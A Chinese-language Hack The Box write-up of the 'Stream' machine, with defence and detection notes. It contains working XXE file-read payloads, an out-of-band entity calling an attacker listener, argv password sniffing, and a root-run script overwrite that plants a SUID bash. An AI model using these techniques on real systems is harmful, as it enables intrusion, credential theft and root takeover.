---
title: "Stream - Linux - Medium"
date: 2026-10-18
draft: false
description: "一台围绕航空数据管道搭建的 Linux 机器。入口是一个暴露了 heapdump 的 Spring Boot 网关，凭据在 H2 内存库和 ClickHouse 之间复用；真正的攻击面藏在 Kafka 数据流的下游——一个开了外部实体解"
tags: ["Linux"]
categories: ["Writeup"]
isStarred: false
---

> 一台围绕航空数据管道搭建的 Linux 机器。入口是一个暴露了 heapdump 的 Spring Boot 网关，凭据在 H2 内存库和 ClickHouse 之间复用；真正的攻击面藏在 Kafka 数据流的下游——一个开了外部实体解析的 Python XML 解析器。拿到文件读取之后，root 是通过一个"每两分钟执行一次 ClickHouse `user_files` 里的脚本"的定时任务拿下的。

| 项目 | 值 |
|---|---|
| 平台 | Hack The Box |
| 机器 | Stream |
| 系统 | Linux / Ubuntu 24.04（kernel 6.8.0-146-generic） |
| 难度 | Medium |
| 目标 IP | 10.129.4.241 |
| 日期 | 2026-10-18 |

---

## 攻击链总览

```text
80  /actuator/heapdump
      └─> H2 明文凭据 svc_events:Yl4aCgh4y2PnU
            └─> 密码复用 → ClickHouse (db.htb-airport.htb)，partner_feed.* 读写
                  └─> Kafka 引擎表 DDL 暴露数据管道
                        └─> 8081 是哑管道，真正的 XML 解析器在下游 (aidx-parser)
                              └─> lxml XXE（file:// 可读）
                                    └─> 回显通道：实体值 → JSON topic → ClickHouse 可 SELECT
                                          ├─> /etc/passwd、systemd unit、源码、/opt/* 配置
                                          └─> /proc/<PID>/root 绕过 ProtectHome
                                                └─> Kafka JAAS 明文 → ssh svc-infra
                                                      └─> root 定时任务执行 user_files 下的 Python
                                                            └─> 抓 argv 得 ClickHouse default 密码
                                                                  └─> file() 覆盖 formatter
                                                                        └─> root 执行 → SUID bash
```

---

## 0. 工具

- nmap（TCP connect 扫描）
- ffuf（vhost 枚举）
- curl
- Python 3.12（heapdump 字符串提取、payload 构造）
- ssh

---

## 1. 侦查

### 1.1 端口扫描

第一轮直接扫全端口：

```console
imawuya@htb:~$ nmap -sT -p- --min-rate 1000 -T4 -oN evidence/allports.txt 10.129.4.241
# Nmap 7.92 scan initiated Sat Oct 17 23:32:26 2026 as: ...
```

`allports.txt` 只留下了一行头部，没有任何端口结果——全端口 `-sT` 在这条链路上跑不到头。于是先退到 top-1000 确认连通性：

```console
imawuya@htb:~$ nmap -sT -Pn -n --top-ports 1000 --max-retries 1 \
                     --max-rtt-timeout 200ms --initial-rtt-timeout 200ms \
                     --min-rate 1000 -T4 -oN evidence/top1000.txt 10.129.4.241
# Nmap 7.92 scan initiated Sat Oct 17 23:44:43 2026 as: ...
Nmap scan report for 10.129.4.241
Host is up.
All 1000 scanned ports on 10.129.4.241 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

# Nmap done at Sat Oct 17 23:46:04 2026 -- 1 IP address (1 host up) scanned in 81.12 seconds
```

结果是 1000 个端口全部 `filtered`。两个可疑点：

1. 上一个靶机刚能打进 80 端口，网络是通的；
2. `filtered` 是"没有回应"，而这条链路的延迟远高于 nmap 默认的 200 ms 探针超时。

这不是"全部被封"，是"全部被误判成超时"。放宽超时后重扫：

```console
imawuya@htb:~$ nmap -sT -Pn -n --top-ports 1000 --max-retries 2 \
                     --max-rtt-timeout 2000ms --initial-rtt-timeout 1000ms \
                     --min-rate 300 -T4 -oN evidence/top1000b.txt 10.129.4.241
# Nmap 7.92 scan initiated Sat Oct 17 23:46:22 2026 as: ...
Nmap scan report for 10.129.4.241
Host is up (0.69s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sat Oct 17 23:58:44 2026 -- 1 IP address (1 host up) scanned in 741.56 seconds
```

1000 个端口花了 12 分钟。全端口用同样参数再跑一遍，结果：

```console
imawuya@htb:~$ nmap -sT -Pn -n -p- --max-retries 2 \
                     --max-rtt-timeout 2000ms --initial-rtt-timeout 1000ms \
                     --min-rate 300 -T4 10.129.4.241
# 扫描结果
22/tcp    open  ssh
80/tcp    open  http
8081/tcp  open  http
34401/tcp open  unknown
```

**8081 和 34401 不在 top-1000 列表里，只有全端口扫描才会出现。** 这个教训在后面的所有步骤里都成立：慢链路 + 默认参数 = 假阴性。

对开放端口做版本探测：

```console
imawuya@htb:~$ nmap -sT -sV -Pn -p22,80,8081,34401 10.129.4.241
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu-24.04
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
8081/tcp  open  http     uvicorn
34401/tcp open  unknown
```

### 1.2 80 端口

```console
imawuya@htb:~$ curl -si http://10.129.4.241/
HTTP/1.1 301 Moved Permanently
Server: nginx/1.24.0 (Ubuntu)
Location: http://api.htb-airport.htb/
Content-Length: 178
```

```console
imawuya@htb:~$ curl -s http://api.htb-airport.htb/
{"service":"terminal-edge-gateway","status":"operational","version":"1.0.0",
 "upstreams":{...}}
```

错误页是 `{"timestamp":...,"status":404,"error":"Not Found","path":"..."}`，`OPTIONS` 返回 `Accept-Patch`——Spring Boot / Tomcat 的特征。

直接请求 actuator：

```console
imawuya@htb:~$ curl -s http://api.htb-airport.htb/actuator
{"_links":{"heapdump":{"href":"http://api.htb-airport.htb/actuator/heapdump"}}}
```

其余常用端点（`env`、`health`、`info`、`mappings`、`threaddump`）全部 404。

配置里只暴露了 heapdump 一个端点——这不是"顺手开的"，是专门留的入口。

### 1.3 vhost 枚举

nginx 的 301 指向域名而不是 IP，说明后端按 Host 路由。先请求一个不存在的 Host 拿到基线大小（178 字节），再跑 ffuf：

```console
imawuya@htb:~$ curl -s -o /dev/null -w '%{size_download}\n' \
                     -H 'Host: nothing.htb-airport.htb' http://10.129.4.241/
178
```

```console
imawuya@htb:~$ ffuf -u http://10.129.4.241/ \
                     -H "Host: FUZZ.htb-airport.htb" \
                     -w /opt/wordlists/subdomains-10000.txt \
                     -fs 178 -t 40 -s
# 命中 api、db
```

枚举出两个 vhost：`api` 是之前的主机名，`db` 是新的。`db` 的响应体很短，但带了一个决定性的头：

```console
imawuya@htb:~$ curl -si -H 'Host: db.htb-airport.htb' http://10.129.4.241/
HTTP/1.1 200 OK
X-ClickHouse-Summary: read_rows:0, read_bytes:0, written_rows:0, written_bytes:0
```

**ClickHouse 的 HTTP 接口。** 到这里，攻击面从"一个 Spring Boot 小应用"扩展到"一整套数据栈"。

---

## 2. 枚举

### 2.1 heapdump

```console
imawuya@htb:~$ curl -sI http://api.htb-airport.htb/actuator/heapdump
Content-Type: application/octet-stream
Content-Length: 58803940
```

```console
imawuya@htb:~$ curl -s http://api.htb-airport.htb/actuator/heapdump \
                          -o evidence/heapdump_new.hprof
$ ls -l evidence/heapdump_new.hprof
-rw-r--r-- 1 imawuya 197609 58803940 Oct 18 02:00 evidence/heapdump_new.hprof
```

链路只有 17–28 KB/s，这个文件下载了约 45 分钟。

> **坑：不要用 `curl -C -` 续传。** heapdump 是请求时实时生成的，每次内容都不同。断点续传会把两个不同版本拼在一起，HPROF 结构在拼接处必然损坏（表现为解析到中途遇到非法 tag）。断了就重下。

heapdump 是 HPROF 二进制格式，体量 59 MB 但应用本身只有三个类，剩下的全是框架对象。最有效的提取方式是按字符串扫描 + 定位应用类：

```console
imawuya@htb:~$ strings -n 6 evidence/heapdump_new.hprof > evidence/new_strings.txt
$ grep -n -E 'jdbc:|DB_|DataSourceConfig|terminal-api' evidence/new_strings.txt | head
59098 xjdbc:h2:mem:terminaldb;MODE=PostgreSQL;DB_CLOSE_DELAY=-1
119901 svc_events
123921 com/htb/terminal/config/DataSourceConfig
209064 Yl4aCgh4y2PnU
232258 nested:/opt/terminal-api/terminal-api-1.0.0.jar/!BOOT-INF/lib/...
354808 CREATE USER IF NOT EXISTS "SVC_EVENTS" SALT 'd39d4251fea03bce' \
       HASH '3520a44c895d98debba0ed4f827751df604c8585a62bae2e5e51caea58552b0b' ADMIN
```

同时确认了三点：

1. 数据库是 **H2 内存库**（`jdbc:h2:mem:`），不是 MySQL/PostgreSQL——后面所有 SQL 语法都要按 H2 来；
2. 应用只有 `TerminalApiApplication`、`DataSourceConfig`、`StatsController` 三个自有类，**没有任何 Kafka 相关类**；
3. 应用用户是 `svc-infra`，jar 在 `/opt/terminal-api/terminal-api-1.0.0.jar`。

第 2 点当时没有立刻用上，但它是一个重要的负结果：**80 端口上的应用不在数据管道里**，后面找 XML 解析器时不用再回头看它。

顺带用 H2 自己的算法验证了密码的正确性（防止 heapdump 里读到的是旧配置）：

```text
final = SHA256( SHA256( UTF-16BE( userName + "@" + password ) ) + salt )
```

用官方 `h2.jar` 的 `CREATE USER ... SALT ... HASH ...` 行为交叉验证，与 Python 实现逐字节一致。这条验证本身是成功的，但由此展开的爆破尝试是纯粹的时间浪费（见 [A.3](#a3-爆破-h2-哈希)）。

### 2.2 ClickHouse 密码复用

`db.htb-airport.htb` 的 `/` 响应体很短，说明它在等待查询参数。`default` 用户需要密码，但那行明文正好是 `svc_events`——同名账号，直接试：

```console
imawuya@htb:~$ CH='http://db.htb-airport.htb/?user=svc_events&password=Yl4aCgh4y2PnU'
$ curl -s "$CH" --data-binary 'SELECT currentUser() FORMAT TSV'
svc_events
```

权限：

```console
imawuya@htb:~$ curl -s "$CH" --data-binary 'SHOW GRANTS FOR CURRENT_USER FORMAT TSV'
GRANT SELECT, INSERT ON partner_feed.* TO svc_events
```

**密码复用是这台机器的第一个"结构性"设计**：一个 Java 应用的数据库配置，直接打开了整条数据管道的读取权限。

### 2.3 Kafka 表

只看业务表没有意义，先看引擎类型——ClickHouse 的 `Kafka` 引擎表会把 broker、topic 等连接参数写在 DDL 里：

```console
imawuya@htb:~$ curl -s "$CH" --data-binary \
  "SELECT name, engine FROM system.tables WHERE database='partner_feed' FORMAT TSV"
flightleg_raw           MergeTree
flightleg_json          MergeTree
flightleg_raw_kafka     Kafka
flightleg_raw_mv        MaterializedView
flightleg_json_kafka    Kafka
flightleg_json_mv       MaterializedView
```

`SHOW CREATE TABLE` 拿到了完整定义（节选，重点是 topic 与格式）：

```console
imawuya@htb:~$ curl -s "$CH" --data-binary \
  "SHOW CREATE TABLE partner_feed.flightleg_raw_kafka FORMAT TSV"
CREATE TABLE partner_feed.flightleg_raw_kafka
(
    `raw` String,
    `source` String,
    `event_ts` DateTime
)
ENGINE = Kafka
SETTINGS kafka_broker_list = '127.0.0.1:9092',
         kafka_topic_list = 'aidx.flightleg.raw.v1',
         kafka_format = 'JSONEachRow'
```

```console
imawuya@htb:~$ curl -s "$CH" --data-binary \
  "SHOW CREATE TABLE partner_feed.flightleg_json_kafka FORMAT TSV"
CREATE TABLE partner_feed.flightleg_json_kafka
(
    `transaction_id` String,
    `event` String
)
ENGINE = Kafka
SETTINGS kafka_broker_list = '127.0.0.1:9092',
         kafka_topic_list = 'aidx.flightleg.json.v1',
         kafka_format = 'JSONEachRow'
```

结构读出来是这样的：

```text
外部 POST → [ingest] → aidx.flightleg.raw.v1 → [???] → aidx.flightleg.json.v1 → ClickHouse
```

表里确实存着原始 XML，可以直接抽样确认报文格式：

```console
imawuya@htb:~$ curl -s "$CH" --data-binary \
  "SELECT raw FROM partner_feed.flightleg_raw LIMIT 1 FORMAT JSONEachRow" | head -c 260
{"raw":"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<ns0:IATA_AIDX_FlightLegNotifRQ\n    xmlns:ns0=\"http:\/\/www.iata.org\/IATA\/2007\/00\"\n    xmlns:xsi=\"http:\/\/www.w3.org\/2001\/XMLSchema-instance\" ...
```

实际导出了 55 条原始报文（`evidence/ch_raw.json`），内容全是合法的 `IATA_AIDX_FlightLegNotifRQ`，带 `LegIdentifier`、`AirportResources`、`OperationTime` 等字段——和 8081 要求的四个元素完全对应。

`raw → json` 之间必然有一个消费者在解析 XML。ClickHouse 只负责把两个 topic 各自落表，**不可能是它做的转换**（Kafka 表本身不做 XML 解析）。

这个中间环节就是后面所有事情的核心。但此时手上只有 ClickHouse 客户端，看不到进程列表——只能从外部行为去推断它。

### 2.4 8081 端口

```console
imawuya@htb:~$ curl -s http://10.129.4.241:8081/
{
  "service": "AIDX flight-leg ingest",
  "how": {"method":"POST","path":"/feeds/aidx",
          "content_type":"application/xml","max_bytes":262144},
  "required_elements": ["IATA_AIDX_FlightLegNotifRQ","Originator",
                        "FlightLeg","LegIdentifier"],
  "note": "Ingest does not parse. Full validation happens downstream."
}
```

`note` 写得很明白，但"不解析"到底到什么程度，必须实测。关键的一个测试是：

| 测试 | 结果 | 结论 |
|---|---|---|
| 发送合法 XML | 202 / 写入 raw topic | 正常接收 |
| 把 `<LegIdentifier>` 放进 `<![CDATA[...]]>` | 仍然通过 | **不是解析，是子串匹配** |

也就是说 ingest 只做三件事：以 `<?xml` 开头、长度 ≤ 262144、用子串匹配四个元素名。判定是按字节做的，所以编码声明必须紧贴 body 开头。

**这意味着在 8081 上打 XXE、XInclude、XSLT 都没有意义**——它根本不碰 XML 解析器。真正的解析发生在那段 `???` 里。

### 2.5 34401 端口

外部连接显示 `open`，但 TCP 握手完成后对端立刻 close：用 curl 请求只会得到 `Empty reply from server`，没有任何协议层响应。逐一试过：

- H2 TCP（`StartupMessage` 变体）
- PostgreSQL `StartupMessage`
- Kafka `ApiVersions`（v3 / v4）
- Kafka `SaslHandshake`
- Redis `PING`
- AMQP `protocol header`
- TLS `ClientHello`

全部 accept 后立即断开。说明是防火墙或监听器的 IP ACL，只允许 127.0.0.1。后来进入机器内部确认了这是一个本地监听，且不在攻击链上。

---

## 3. 初始访问

### 3.1 XXE 探测

从 ClickHouse 只能看到表，看不到进程。要确认下游解析器的身份，用 XXE 做探针——只要它能读文件，就说明解析器存在，并且知道它是什么语言。

第一次测试：

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<IATA_AIDX_FlightLegNotifRQ>
  <Originator><EntityCode>TEST</EntityCode></Originator>
  <FlightLeg><LegIdentifier>
    <Airline>&xxe;</Airline>
    <FlightNumber>98</FlightNumber>
  </LegIdentifier></FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

发送：

```console
imawuya@htb:~$ curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST http://10.129.4.241:8081/feeds/aidx \
  -H 'Content-Type: application/xml' --data-binary @xxe.xml
202
```

解析成功后，实体的值会变成 `Airline` 字段的文本，一路流到 JSON topic。查：

```console
imawuya@htb:~$ sleep 12
$ curl -s "$CH" --data-binary \
  "SELECT airline FROM partner_feed.flightleg_json
   WHERE flight_number='98' ORDER BY ingested DESC LIMIT 1 FORMAT TSV"
stream
```

返回 `stream`——**`/etc/hostname` 的内容**。整条回显链路成立：

```text
XXE 读文件 → Python 解析器 → JSON topic → ClickHouse 落表 → 攻击者 SELECT
```

同时试了带外通道：

```xml
<!ENTITY xxe SYSTEM "http://10.10.16.180:8000/probe">
```

以及在攻击机起监听：

```console
imawuya@htb:~$ python -m http.server 8000
```

记录里能看到 10.129.4.241 对监听端发起过请求（`evidence/http_listen.log`），但参数实体无法把 `file://` 的内容拼进 URL 带回来，换 webhook.site 也没有拿到内容。结论：**OOB 外带不可用**，`file://` 实体读取本身是正常的。这一条排除了外带方案，但也逼出了更好的解——JSON 回显不需要出网。

期间的延迟是 8–12 秒（Kafka 消费 + 解析 + 写回 + ClickHouse merge），所有查询都按这个节奏等待。

### 3.2 文件读取

一个固定模板，换文件路径即可。以下命令在攻击机的 Linux/WSL bash 中执行：

```bash
read_file() {
  local path="$1"
  cat > /tmp/read.xml <<EOF
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file://$path">]>
<IATA_AIDX_FlightLegNotifRQ>
  <Originator><EntityCode>READ</EntityCode></Originator>
  <FlightLeg><LegIdentifier>
    <Airline>&xxe;</Airline>
    <FlightNumber>98</FlightNumber>
  </LegIdentifier></FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
EOF
  curl -s -o /dev/null -X POST http://10.129.4.241:8081/feeds/aidx \
       -H 'Content-Type: application/xml' --data-binary @/tmp/read.xml
  sleep 12
  curl -s "$CH" --data-binary \
    "SELECT airline FROM partner_feed.flightleg_json
     WHERE flight_number='98' ORDER BY ingested DESC LIMIT 1 FORMAT TSV"
}
```

先读的几个文件：

```console
imawuya@htb:~$ read_file /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
svc-infra:x:1000:1000::/home/svc-infra:/bin/bash
martin_cole:x:1001:1001::/home/martin_cole:/bin/bash
clickhouse:x:996:996::/var/lib/clickhouse:/bin/false
```

```console
imawuya@htb:~$ read_file /etc/group
...
users:x:100:svc-infra,martin_cole
```

没有任何 sudo 组。

`/etc/passwd` 给出了用户表。接着读服务定义和源码——这是 XXE 真正的价值：**不需要 shell 就能审计整条管道**。

```console
imawuya@htb:~$ read_file /etc/systemd/system/aidx-parser.service
# 关键指令（节选）
[Service]
User=svc-infra
ExecStart=/opt/aidx-pipeline/.venv/bin/python app/parser_worker.py
ProtectHome=true
ProtectSystem=strict
PrivateTmp=true
NoNewPrivileges=true
ReadWritePaths=/opt/aidx-pipeline /var/lib/aidx
```

```console
imawuya@htb:~$ read_file /opt/aidx-pipeline/app/aidx_common.py
def _plain_parser() -> etree.XMLParser:
    return etree.XMLParser(
        load_dtd=True,
        resolve_entities=True,
        no_network=False,
    )
```

`resolve_entities=True` 加上 `load_dtd=True`——标准的 XXE 配置。

`parser_worker.py` 说明了消息流：循环 `consumer.poll()` 拉取 `RAW_TOPIC` 的消息，交给 `safe_parse()` 解析，`to_full_canonical()` 转成字典，再以 `partition_key` 为 key 投递到 `JSON_TOPIC`；解析抛 `A.RejectedMessage` 时投递到 DLQ，并把原因放进 header。

**`ProtectHome=true`** 意味着解析器看到的 `/home` 是一个空的 tmpfs。`/proc/self/mounts` 证实了这一点。`/root` 同理。

### 3.3 ProtectHome 绕过

ProtectHome 只影响解析器自己的 mount namespace。同机上还有一个没有加这个限制的服务——80 端口的 `terminal-api.service`。要借用它的 namespace，需要它的 PID。

想到三种方式，前两种受限：

1. `/proc/*/cmdline` 遍历（但 ProtectHome 不影响 `/proc`，理论上可读；问题是要过滤出目标进程）
2. `ps aux`（通过 XXE 读不到命令输出，只能读文件）
3. **cgroup v2**——systemd 的每个 unit 在 `/sys/fs/cgroup/system.slice/<unit>/cgroup.procs` 里列自己的 PID

第三条最干净：

```console
imawuya@htb:~$ read_file /sys/fs/cgroup/system.slice/terminal-api.service/cgroup.procs
1453
```

然后所有路径都改成 `/proc/1453/root/...`：

```console
imawuya@htb:~$ read_file /proc/1453/root/etc/passwd
root:x:0:0:root:/root:/bin/bash
$ read_file /proc/1453/root/home/martin_cole/user.txt

```

最后一条返回的是空行。但这次是"权限被拒"而不是"文件不存在"。区分方法：**不存在的文件返回空内容（落一行空值），权限被拒的文件让解析器直接抛错、不落行**。

确认一下权限：`/home/martin_cole` 是 `750 martin_cole:martin_cole`，`svc-infra`（UID 1000）不属于这个组。**命名空间已经绕过了，剩下的纯粹是文件权限问题**——必须拿到一个有权限的账号，或者 root。

### 3.4 Kafka 配置

继续按"读配置找凭据"的思路走。`/etc/partner-sync/ch.pw` 是 600 root，读不到。但 Kafka 的配置是给服务进程读的，权限通常是 644：

```console
imawuya@htb:~$ read_file /opt/kafka_2.13-4.3.1/config/server.properties
listeners=PLAINTEXT://127.0.0.1:9092,SASL_PLAINTEXT://127.0.0.1:9094,CONTROLLER://127.0.0.1:9093
sasl.enabled.mechanisms=PLAIN
listener.name.sasl_plaintext.plain.sasl.jaas.config=\
    org.apache.kafka.common.security.plain.PlainLoginModule required \
    user_svc_infra="Ny2hdpme$bwT3";
```

明文 JAAS。`svc_infra` 是 `svc-infra` 的 Kafka 用户，但密码很可能就是系统密码：

```console
imawuya@htb:~$ ssh svc-infra@10.129.4.241
svc-infra@10.129.4.241's password:
svc-infra@stream:~$
```

落入 `svc-infra` shell。

---

## 4. 提权

### 4.1 枚举

拿到 shell 之后先做标准检查——但这次有一个明确的方向：**找 root 会执行的东西**。

```console
svc-infra@stream:~$ id
uid=1000(svc-infra) gid=1000(svc-infra) groups=1000(svc-infra)

svc-infra@stream:~$ sudo -l
[sudo] password for svc-infra:
Sorry, user svc-infra may not run sudo on stream.
```

```console
svc-infra@stream:~$ systemctl list-timers --all | grep aidx
aidx-dlq-drainer.timer  ...
```

`aidx-dlq-drainer.timer` 每两分钟触发一次。

```console
svc-infra@stream:~$ systemctl cat aidx-dlq-drainer.service aidx-dlq-drainer.timer
# /etc/systemd/system/aidx-dlq-drainer.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /opt/ops/dlq_drainer.py

# /etc/systemd/system/aidx-dlq-drainer.timer
[Timer]
OnBootSec=1min
OnUnitActiveSec=2min
```

**一个 root 权限的 oneshot，每两分钟执行一次自定义 Python。** 脚本本身可读：

```console
svc-infra@stream:~$ cat /opt/ops/dlq_drainer.py
```

```python
FORMATTER = os.environ.get(
    "AIDX_FORMATTER", "/var/lib/clickhouse/user_files/aidx_quarantine.py")
CH_PW_FILE = os.environ.get("CH_PW_FILE", "/etc/partner-sync/ch.pw")

def _format(raw):
    p = subprocess.run(["python3", FORMATTER],
                       input=raw, capture_output=True, check=False)
    parts = p.stdout.decode("utf-8", "replace").strip().split("\t")
    return tuple(parts) if len(parts) == 3 else (str(len(raw)), "UNKNOWN", "")

# ... 处理 DLQ 消息 ...

subprocess.run(
    ["clickhouse-client", "--user", "default", "--password", _pw(), "-q", q],
    check=False)
```

两个观察：

1. **root 执行的脚本路径**是 `/var/lib/clickhouse/user_files/aidx_quarantine.py`——这是 ClickHouse 的 `user_files` 目录。
2. **root 的 clickhouse-client 命令行里带密码**，密码从 `/etc/partner-sync/ch.pw`（600 root）读取。

``/var/lib/clickhouse/user_files/aidx_quarantine.py` 由 drainer 的代码指定。它正常工作时输出三列 tab 分隔的字符串（长度、状态、预览），这个接口约定后面必须保持，否则 drainer 的返回值解析会退化为 `(len, "UNKNOWN", "")`。

要把它换掉，需要 `user_files` 目录的写权限。最直接的入口是 ClickHouse 自己——`default` 账号的 `file()` 表函数可以写该目录下的任意路径。所以下一步是先拿到 `default` 的密码。

### 4.2 argv 泄露

`clickhouse-client` 在启动后会尝试覆盖自己的 argv（把密码抹掉），但覆盖有极短的时间窗口。drainer 每两分钟跑一次，每次只有几十毫秒，需要紧密轮询。

**关键细节：用 `pgrep -af`，不是 `pgrep -a`。** `-a` 只显示 comm（内核截断到 15 字符），`clickhouse-client` 有 17 个字符，永远匹配不上。`-f` 匹配完整命令行，`-a` 打印完整命令行。

```console
svc-infra@stream:~$ while true; do
  out=$(pgrep -af clickhouse-client)
  [ -n "$out" ] && echo "$out" && break
  sleep 0.05
done
clickhouse-client --user default --password N3v3rs33nD4T4 -q INSERT INTO aidx_ops.failed_ingest ...
```

验证凭据：

```console
svc-infra@stream:~$ clickhouse-client --user default --password 'N3v3rs33nD4T4' -q 'SELECT currentUser()'
default
```

> 注意：同一个密码走 HTTP 接口会被拒。`default` 用户只允许本机原生协议。

### 4.3 formatter 覆盖

`default` 用户拥有完整权限，包括 `INSERT INTO FUNCTION file(...)`——可以直接写 `user_files` 下的任意路径。

payload 要做三件事：保持 formatter 的接口（从 stdin 读、按 tab 分隔写三列，否则 drainer 的解析会出错）、以 root 执行动作、返回合法输出。

```python
# payload.py
import sys, subprocess

raw = sys.stdin.buffer.read()

try:
    subprocess.run(
        ["bash", "-c",
         "cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb; "
         "{ cat /root/root.txt; cat /home/martin_cole/user.txt; } "
         "> /tmp/pwned.txt; chmod 666 /tmp/pwned.txt; "
         "id > /tmp/who.txt; chmod 666 /tmp/who.txt"],
        timeout=15)
except Exception:
    pass

sys.stdout.write(str(len(raw)) + "\tPWN\tpreview")
```

写入：

```console
svc-infra@stream:~$ clickhouse-client --user default --password 'N3v3rs33nD4T4' \
  --query "INSERT INTO FUNCTION file(
             '/var/lib/clickhouse/user_files/aidx_quarantine.py',
             'RawBLOB', 'data String') FORMAT RawBLOB" \
  < /tmp/payload.py
```

`RawBLOB` 是关键：默认的 `TabSeparated` 会转义特殊字符，Python 源码会被破坏。`RawBLOB` 原样落盘。

验证：

```console
svc-infra@stream:~$ head -3 /var/lib/clickhouse/user_files/aidx_quarantine.py
import sys, subprocess

raw = sys.stdin.buffer.read()
```

### 4.4 触发 DLQ

drainer 只处理 `aidx_ops.failed_ingest` 里的消息。产生一条：向 8081 发送一条**能通过 ingest 的字符串检查、但 XML 本身不合法**的消息。

```console
imawuya@htb:~$ printf '<?xml version="1.0"?><IATA_AIDX_FlightLegNotifRQ><Originator>x</Originator><FlightLeg><LegIdentifier>y</LegIdentifier></FlightLeg><oops' \
  | curl -s -o /dev/null -w '%{http_code}\n' -X POST http://10.129.4.241:8081/feeds/aidx \
         -H 'Content-Type: application/xml' --data-binary @-
202
```

它包含四个必需子串（通过 ingest），但 XML 未闭合（解析失败 → `A.RejectedMessage` → DLQ）。

最多两分钟后：

```console
svc-infra@stream:~$ ls -l /tmp/rb /tmp/who.txt
-rwsr-xr-x 1 root root ... /tmp/rb
-rw-rw-rw- 1 root root ... /tmp/who.txt

svc-infra@stream:~$ cat /tmp/who.txt
uid=0(root) gid=0(root) groups=0(root)
```

### 4.5 root

```console
svc-infra@stream:~$ /tmp/rb -p -c 'id'
euid=0(root) gid=1000(svc-infra) groups=1000(svc-infra)

svc-infra@stream:~$ /tmp/rb -p -c 'cat /home/martin_cole/user.txt'
03548d2d5ed3c0b2dfbb6195a0724176

svc-infra@stream:~$ /tmp/rb -p -c 'cat /root/root.txt'
5b07b056cb88b6a3d955e31ecc9cd1aa
```

---

## 5. 复盘

### 5.1 环节

五个环节各自都是"正常设计"，组合起来才致命：

| 环节 | 正常性 | 风险 |
|---|---|---|
| Actuator heapdump 暴露 | 便于排障 | 内存里的明文凭据 |
| 密码跨系统复用 | 方便运维 | 一个泄露打开全链路 |
| Kafka 表 DDL 可见 | ClickHouse 设计如此 | 攻击者能看到数据流拓扑 |
| lxml 开启实体解析 | 为了解析带 DTD 的 AIDX 报文 | XXE |
| root 定时器执行外部路径脚本 | 把格式化逻辑从代码里解耦 | 可写路径 = root 代码执行 |

单独看每个点都不算"高危漏洞"，但串起来是一条完整的 root 链。

### 5.2 防御

如果这是真实系统，需要改的：

1. **Actuator**：生产环境只暴露 `health`，heapdump 需要认证且永远不对外。
2. **凭据**：不要跨系统复用；H2 内存库也应在启动时从密钥管理系统注入随机密码。
3. **XML 解析**：`resolve_entities=False`，必要时用 `defusedxml`。AIDX 报文不需要外部实体。
4. **沙箱**：`ProtectHome` 是正确的，但同一主机上未加固的服务让它可以被绕过——沙箱必须一致。
5. **root 定时器**：不要执行固定路径下的可写脚本；格式化逻辑应该是带版本的部署产物，或至少校验哈希。
6. **ClickHouse**：`user_files` 目录不应对服务外账号可写；`default` 账号应禁用或加密码后限制网络。

### 5.3 检测

- `/actuator/heapdump` 的大文件下载（59 MB，异常 egress）
- ClickHouse 查询中出现 `system.tables` 全量枚举、`SHOW GRANTS`
- 8081 接收体含 `<!DOCTYPE` / `SYSTEM "file://` 的请求
- XXE 后短时间大量异常 XML（同一 FlightNumber、不同文件路径）
- `clickhouse-client` 的高频进程枚举（`pgrep` 循环）
- `/var/lib/clickhouse/user_files/*.py` 的内容变更

---

## 附录 A 走过的弯路

> 失败路径同样是攻略的一部分。这一节按时间顺序记录所有被验证为死路的方向，以及是怎么确认它们不可行的。

### A.1 端口扫描全 filtered

见 [1.1](#11-端口扫描)。根因是 RTT 与默认超时不匹配。**教训：VPN 接入时先测一个已知开放端口，确认扫描器在正确工作，再相信结果。**

### A.2 heapdump 续传损坏

第一次用 `curl -C -` 分三次下载。拼出来的文件 **84,519,274 字节，比服务端声明的 58,803,940 还大**——因为三次请求拿到的是三个不同的快照，全部叠在了一起。HPROF 解析到中途遇到未知 tag（`0x70`）。

**判断方法**：先比大小。本地文件大于 `Content-Length`，就说明不是同一次响应；HPROF 头部正常但结构在中段崩坏，进一步确认是拼接问题。

**修复**：一次性完整下载，校验大小与 `Content-Length` 完全一致。

```console
imawuya@htb:~$ ls -l evidence/hd_partial.bin evidence/tail.bin \
                      evidence/heapdump.hprof evidence/heapdump_new.hprof
-rw-r--r-- 1 imawuya 197609 24399872 Oct 18 00:22 evidence/hd_partial.bin
-rw-r--r-- 1 imawuya 197609  8388608 Oct 18 00:22 evidence/tail.bin
-rw-r--r-- 1 imawuya 197609 84519274 Oct 18 01:07 evidence/heapdump.hprof
-rw-r--r-- 1 imawuya 197609 58803940 Oct 18 02:00 evidence/heapdump_new.hprof

imawuya@htb:~$ curl -sI http://api.htb-airport.htb/actuator/heapdump | grep -i content-length
Content-Length: 58803940
```

### A.3 爆破 H2 哈希

从 heapdump 里拿到的是 H2 的 `CREATE USER ... SALT ... HASH ...`，可以先验证算法再用字典试。

先用 Python 实现了 H2 的哈希算法，并与 `h2.jar` 中 `CREATE USER ... SALT ... HASH ...` 的实际输出逐字节比对，结果一致。算法确认无误后，用 hashcat 模式 1420 跑 rockyou 全量 1434 万条，**0 命中**。原因是密码是随机生成的，不在任何字典里。

**真正的收获**是确认了算法，但这个确认对拿密码没有任何帮助——密码以明文常量存在于同一个 heapdump 的 `DataSourceConfig` 里。

**教训：在同一个泄露源里，先搜明文再考虑破哈希。** 内存中的配置类通常保留原始字符串。

### A.4 SSH 盲试与 fail2ban

